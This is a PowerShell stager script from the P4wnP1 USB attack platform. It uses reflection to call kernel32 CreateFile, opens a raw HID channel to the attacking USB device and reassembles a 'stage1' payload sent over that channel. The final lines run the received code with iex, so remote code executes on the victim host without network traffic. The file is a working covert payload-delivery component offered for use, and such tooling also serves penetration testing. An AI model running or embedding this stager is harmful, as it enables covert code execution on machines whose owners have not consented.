
#    This file is part of P4wnP1.
#
#    Copyright (c) 2017, Marcus Mengs. 
#
#    P4wnP1 is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    P4wnP1 is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with P4wnP1.  If not, see <http://www.gnu.org/licenses/>.


# P4wnP1 HID Script
$USB_VID="1D6B"
$USB_PID="0137"

function ReflectCreateFileMethod()
{
    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName("MaMe82DynAssembly")
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule("MaMe82DynModule", $False)
    $TypeBuilder = $ModuleBuilder.DefineType("MaMe82", "Public, Class")
    # Define the CreateFile Method
    $CreateFileMethod = $TypeBuilder.DefineMethod(
        "CreateFile", # Method Name
        [System.Reflection.MethodAttributes] "Public, Static", # Method Attributes
        [IntPtr], # Method Return Type
        [Type[]] @(
            [String], # lpFileName
            [Int32], # dwDesiredAccess
            [UInt32], # dwShareMode
            [IntPtr], # SecurityAttributes
            [UInt32], # dwCreationDisposition
            [UInt32], # dwFlagsAndAttributes
            [IntPtr] # hTemplateFile
        ) # Method Parameters
    ) 

    # Import DLL
    $CreateFileDllImport = [System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    # Define Fields
    $CreateFileFieldArray = [System.Reflection.FieldInfo[]] @(
        [System.Runtime.InteropServices.DllImportAttribute].GetField("EntryPoint"),
        [System.Runtime.InteropServices.DllImportAttribute].GetField("PreserveSig"),
        [System.Runtime.InteropServices.DllImportAttribute].GetField("SetLastError"),
        [System.Runtime.InteropServices.DllImportAttribute].GetField("CallingConvention"),
        [System.Runtime.InteropServices.DllImportAttribute].GetField("CharSet")
    )

    # Define Values for the fields
    $CreateFileFieldValueArray = [Object[]] @(
        "CreateFile",
        $True,
        $True,
        [System.Runtime.InteropServices.CallingConvention]::Winapi,
        [System.Runtime.InteropServices.CharSet]::Auto
    )

    # Create a Custom Attribute and add to our Method
    $CreateFileCustomAttribute = New-Object System.Reflection.Emit.CustomAttributeBuilder(
        $CreateFileDllImport,
        @("kernel32.dll"),
        $CreateFileFieldArray,
        $CreateFileFieldValueArray
    )
    $CreateFileMethod.SetCustomAttribute($CreateFileCustomAttribute)

    # Create the Type within our Module
    #$MaMe82 = $TypeBuilder.CreateType()
    $TypeBuilder.CreateType()
}

function CreateFileStreamFromDevicePath($MaMe82Class, [String] $path)
{
    # CreateFile method has to be built in [MaMe82]::CreateFile()
    # call ReflectCreateFileMethod to achieve this

    # Call CreateFile for given devicepath
    # (GENERIC_READ | GENERIC_WRITE) = 0XC0000000
    # FILE_FLAG_OVERLAPPED = 0x40000000;
    $handle = $MaMe82Class::CreateFile($path, [System.Int32]0XC0000000, [System.IO.FileAccess]::ReadWrite, [System.IntPtr]::Zero, [System.IO.FileMode]::Open, [System.UInt32]0x40000000, [System.IntPtr]::Zero)

    # Create SafeFileHandle from file 
    #    Note: [Microsoft.Win32.SafeHandles.SafeFileHandle]::new() isn't accessible on PS 2.0 / NET2.0
    #    thus we use reflection to construct FileStream
    #$shandle = [Microsoft.Win32.SafeHandles.SafeFileHandle]::new($devicefile,  [System.Boolean]0)
    $a = $handle, [Boolean]0
    $c=[Microsoft.Win32.SafeHandles.SafeFileHandle].GetConstructors()[0]
    $shandle = $c.Invoke($a)

    # Create filestream from SafeFileHandle
    #$Device = [System.IO.FileStream]::new($shandle, [System.IO.FileAccess]::ReadWrite, [System.UInt32]32, [System.Boolean]1)
    #    Note: again Reflection has to be used to access the constructor of FileStream
    $fa=[System.IO.FileAccess]::ReadWrite
    $a=$shandle, $fa, [System.Int32]64, [System.Boolean]1
    $c=[System.IO.FileStream].GetConstructors()[14]
    $Device = $c.Invoke($a)
    

    return $Device
}

function send_data($file, $source, $dest, $data, $received)
{
    $report_id = [byte] 0
    $src = [byte] $source
    $dst = [byte] $dest
    $snd = [byte] $data.Length
    $rcv = [byte] $received
    
    $i=0
    $bytes = New-Object Byte[] (65)
    $bytes[$i++] = $report_id
    $bytes[$i++] = $src
    $bytes[$i++] = $dst
    $bytes[$i++] = $snd
    $bytes[$i++] = $rcv
    
    $data.CopyTo($bytes, $i)
    
    $devfile.Write($bytes, 0, $bytes.Length)
    
   
}

function read_data($file)
{
    $r = New-Object Byte[] (65)
    $cr = $devfile.Read($r,0,65)
    
    # async read able to send heartbeats, which isn't needed anymore
    #$asyncReadResult = $devfile.BeginRead($r, 0, 65, $null, $null)
    #while (-not $asyncReadResult.IsCompleted)
    #{
    #    # Sending heartbeat data if needed, heartbeat otherwise
    #    $heartbeat = New-Object Byte[] (0)
    #    #send_data $devfile 0 0 $heartbeat 0
    #}
    #$cr = $devfile.EndRead($asyncReadResult)
    
    $i=0
    $report_id = $r[$i++]
    $src = $r[$i++]
    $dst = $r[$i++]
    $snd = $r[$i++]
    $rcv = $r[$i++]
    
    
    $msg = New-Object Byte[] ($snd)
    
    [Array]::Copy($r, $i, $msg, 0, $snd)
    
       
    # msg
    return $src, $dst, $snd, $rcv, $msg
}

function GetDevicePath($USB_VID, $USB_PID)
{
    $HIDGuid="{4d1e55b2-f16f-11cf-88cb-001111000030}"
    foreach ($wmidev in gwmi Win32_USBControllerDevice |%{[wmi]($_.Dependent)} ) {
        #[System.Console]::WriteLine($wmidev.PNPClass)
	    if ($wmidev.DeviceID -match ("$USB_VID" + '&PID_' + "$USB_PID") -and $wmidev.DeviceID -match ('HID') -and -not $wmidev.Service) {
            $devpath = "\\?\" + $wmidev.PNPDeviceID.Replace('\','#') + "#" + $HIDGuid
        }
    }
    $devpath
}



#######
# Init RAW HID device
#########

# Use Reflection to create [MaMe82]::CreateFile from kernel32.dll
$MaMe82Class = ReflectCreateFileMethod

$path= GetDevicePath $USB_VID $USB_PID
# create FileStream to device
$devfile = CreateFileStreamFromDevicePath $MaMe82Class $path
$count = -1
$stage1 = ""

try 
{
    while ($devfile.SafeFileHandle -ne $null)
    {
        $heartbeat = New-Object Byte[] (0)
        send_data $devfile 0 0 $heartbeat 0
    
        $packet = read_data $devfile
        # set RCV to SND to acknowledge full packet in next send
        $src = $packet[0]
        $dst = $packet[1]
        $snd = $packet[2]
        $rcv = $packet[3]
        $msg = $packet[4]

        $utf8 = [System.Text.Encoding]::UTF8.GetString($msg)
 
 
        if ($utf8.StartsWith("end_heartbeat") -and ($count -gt 0))
        {
           [System.Console]::WriteLine("Received last package of stage1")
           
           break
        }
        if ($utf8.StartsWith("begin_heartbeat"))
        {
           $count = 0
           [System.Console]::WriteLine("Received first package of stage1")
        }
        elseif ($count -ge 0)
        {
            # belongs to stream, assemble
            $stage1 += $utf8
            $count += 1
            [System.Console]::WriteLine("Received package $count of stage1")
        }

        
    }
    [System.Console]::WriteLine("stage1 reassembled")
    [System.Console]::WriteLine("$stage1")
    iex $stage1
}
finally
{
    # end main thread
    $devfile.Close()
    $devfile.Dispose()
}